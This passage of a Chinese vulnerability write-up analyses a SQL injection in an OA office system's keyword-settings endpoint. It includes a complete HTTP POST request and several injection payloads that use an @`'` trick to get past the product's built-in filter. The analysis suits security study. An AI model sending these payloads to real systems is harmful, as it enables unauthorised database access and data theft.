            $where = $this->_get_where();
            $config['base_url'] = site_url('setting/keywords/index') . '?kname=' . $this->kname . '&category=' . $this->category;
            $config['total_rows'] = $this->mkeyword->get_keywords_count($where);
            $config['per_page'] = '6';
            $config['uri_segment'] = 4;
            $data['search_url'] = site_url('setting/keywords');
            $data['pages'] = $this->_pagination($config, $where);
            $data['keywords'] = $this->mkeyword->get_keywords($where, $this->uri->segment(4, 0), $config['per_page']);
            $data['kname'] = $this->kname;
            $data['category'] = $this->category;
            $data['category_list'] = get_syscode_list('DOC_CATEGORY');
            $this->load->view('setting/keywords', $data);
        }
5、往前看，分析_get_where方法
    public function _get_where()
        {
            //首先将$_SERVER['QUERY_STRING']参数值变成变量
            parse_str($_SERVER['QUERY_STRING'], $_GET);
            //因为已经传了kname，所以跳过
            if (isset($_GET['kname'])) {
                $this->kname = $_GET['kname'];
            }
            //不传参，也先不看
            if (isset($_GET['category'])) {
                $this->category = $_GET['category'];
            }
            $where = '';
            //将kname的值拼接到$where中
            if ($this->kname) {
                $where = ' and kname like \'%' . $this->kname . '%\'';
            }
            //将category的值拼接到$where中
            if ($this->category) {
                $where .= ' and category=\'' . $this->category . '\'';
            }
            return $where;
        }
6、可以看到这里就是漏洞点了，直接拼接传参到where中，那么回到index方法，注意这一段
    $config['total_rows'] = $this->mkeyword->get_keywords_count($where);
调用了mkeyword的get_keywords_count方法，传参为拼接的$where  
在文件最前面可以看到mkeyword为加载的model  
7、定位到\webroot\general\document\models\mkeyword.php的get_keywords_count方法  
8、代码如下，直接将传过来的$where拼接到sql语句中进行执行
    public function get_keywords_count($where)
        {
            $sql = 'select count(*) as total from doc_keywords where 1=1' . $where;
            $query = $this->db->query($sql, false, true, true);
            return $query->row()->total;
        }
9、然后，这里我就卡住了，因为解密文件的不顺利，我不能直接通过PHPstorm打开跳转找到query方法，于是我冥思苦想，找了好多文件，之后，回到代码中，这里是
**$this- >db->query**，那么是不是就是db这个class中的query方法呢。  
我回去看了Framework.php，其中有这样一个配置，db指向了database  
10、于是我在框架所在的目录下的libraris目录下，发现了database.php，在169行，成功发现了query方法  
11、前面一段检测了select，进行了一些赋值
    public function query($sql, $binds = false, $return_object = true, $QUERY_MASTER = false)
        {   //截取字符串是不是为select
            if (MYOA_DB_USE_REPLICATION && ($QUERY_MASTER || ((strtolower(substr(ltrim($sql), 0, 6)) != 'select') && (strtolower(substr(ltrim($sql), 0, 3)) != 'set')))) {
                if (!is_resource($this->master_conn_id)) {
                    $this->tomasterdb();
                }
                $this->conn_id = $this->master_conn_id;
            }
            else if (is_resource($this->slave_conn_id)) {
                $this->conn_id = $this->slave_conn_id;
            }
            //$binds为false
            if ($binds !== false) {
                $sql = $this->compile_binds($sql, $binds);
            }
            //全局搜索save_queries，为true，将sql赋值到queries数组中
            if ($this->save_queries == true) {
                $this->queries[] = $sql;
            }
            $time_start = list($sm, $ss) = explode(' ', microtime());
12、往下看
    //这里先调用方法_execute处理$sql
    if (false === $this->result_id = $this->_execute($sql)) {
                if ($this->save_queries == true) {
                    $this->query_times[] = 0;
                }
                $this->display_error();
                return false;
            }
            $time_end = list($em, $es) = explode(' ', microtime());
            $this->benchmark += ($em + $es) - ($sm + $ss);
            if ($this->save_queries == true) {
                $this->query_times[] = ($em + $es) - ($sm + $ss);
            }
            ->query_count++;
            if ($return_object !== true) {
                return true;
            }
            //这里是最后的返回值，创建了一个TD_Database_result对象
            $RES = new TD_Database_result();
            $RES->conn_id = $this->conn_id;
            $RES->result_id = $this->result_id;
            return $RES;
13、查看_execute方法，调用了_prep_query方法处理字符串，然后调用db_query执行  
14、_prep_query方法进行了一些delete的过滤  
15、db_query方法以我多年的经验，很快找到是在/inc/conn.php文件中，这里跟前面2015的一样了，sql_injection基本过滤了注入需要的函数  
16、回到前面的keyword.php，因为原复现的时候，是通过传参kname进行注入的，但是实际上我们发现还有一个category也好像没有任何过滤进行了执行，尝试之后发现，果然也存在  
数据包如下：
    POST /general/document/index.php/setting/keywords HTTP/1.1
    Host: 10.211.55.3
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 140
    Origin: http://10.211.55.3
    Connection: close
    Referer: http://10.211.55.3/general/document/index.php/setting/keywords
    Cookie: PHPSESSID=gdtugivsnejrt9l9um0v48dou7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=429762af; UI_COOKIE=0; LOGIN_LANG=cn
    Upgrade-Insecure-Requests: 1
    _SERVER%5BQUERY_STRING%5D=category%3D1%27%2Band%40%60%27%60%2Bor%2Bif%28substr%28user%28%29%2C1%2C4%29%3D%27root%27%2C1%2Cexp%28710%29%29%23
17、可能这就是分析漏洞的快乐吧，突然就发现了其他类似的接口同样存在漏洞。当然因为是sql注入，也想看看具体执行了什么语句，这里使用jdr师傅自己写的mysql监控工具监控mysql信息  
工具下载地址：  
数据库连接信息可以在这里看到  
监控后执行，可以看到完整的sql语句
    select count(*) as total from doc_keywords where 1=1 and category='1' and@`'` or if(substr(user(),1,4)='root',1,exp(710))#'
18、然后，我就好奇了为什么需要在里面加上
    @`'`
19、尝试fuzz一下，发现，如果没有多一个单引号，关键字会被检测出来
    _SERVER[QUERY_STRING]=category=1'+and@``+or+if(substr(user(),1,4)='root',1,exp(710))#
如果没有@，那么语句就会报错
    _SERVER[QUERY_STRING]=category=1'+and`'`+or+if(substr(user(),1,4)='root',1,exp(710))#
20、这里就很明显发现了大佬们bypass的一个思路，首先通过单引号跳过了检测的代码，然后又通过@和反引号，使后面的语句成功执行。  
我将sql语句放到数据库中执行，发现不会报错  
但是如果删掉@，就报错了，因为多了个单引号  
21、通过查阅资料我了解到了，mysql中的@表示设置一个变量，而``反引号则是转义符，这里是通过设置一个反引号的变量来绕过过滤。真的觉得太强了。  
回到过滤的sql_injection方法，可以看到就是这里导致了存在绕过  
22、因为直接看有点搞不清楚具体逻辑，于是我将其单独拎出来，编写成一个php文件运行调试
可以看到输出结果已经去掉了后面的语句  
23、因为后面的过滤都是过滤$clean，而这里很明显看到，$clean已经被 **@`'`**截断了，所以绕过了  
经过调试分析代码，我理解了，在原来的获取注入点检测的逻辑，是将单引号里面的值替换为$s$，所以正常的SQL语句提取结果应该是：
    select count(*) as total from doc_keywords where 1=1 and category='1' and or if(substr(user(),1,4)='root',1,exp(710))#'
    #1、找第1、2个单引号
    select count(*) as total from doc_keywords where 1=1 and category='1'
    #2、找第3、4个单引号
    and or if(substr(user(),1,4)='root'
24、再看看加了单引号之后的效果
    select count(*) as total from doc_keywords where 1=1 and category='1' and@`'` or if(substr(user(),1,4)='root',1,exp(710))#'
    #1、找第1、2个单引号
    select count(*) as total from doc_keywords where 1=1 and category='1'
    #2、找第3、4个单引号
    '` or if(substr(user(),1,4)='
    #3、第5个单引号后面到注释符前都没有单引号，所以不构成一对，不进行拼接
搞懂了，瞬间觉得师傅们的思路太强了。
## (六) 小结
大概整理了几个漏洞，本来是想说SQL注入可以简单过一遍的，但是在2017那个SQL注入那里，我学到了好多，分析这个漏洞也是最花时间的。这应该可以说是干货了，也因为之前没有接触过，所以被惊了一下。后面我会继续进行分析，大家一起学习。